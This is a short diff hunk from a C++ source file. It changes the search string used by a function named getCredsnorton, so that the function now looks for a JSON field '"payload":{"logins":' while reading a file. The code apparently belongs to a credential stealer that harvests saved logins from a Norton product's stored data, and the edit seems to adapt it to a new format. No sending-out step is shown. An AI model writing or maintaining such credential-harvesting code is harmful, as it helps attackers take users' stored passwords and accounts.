@@ -13,7 +13,7 @@ int getCredsnorton() {
         return 1;
     }
 
-    std::string searchKeyword = "\"payload\":[{\"key\":";
+    std::string searchKeyword = "\"payload\":{\"logins\":";
     std::string foundData;
 
     while (!file.eof()) {
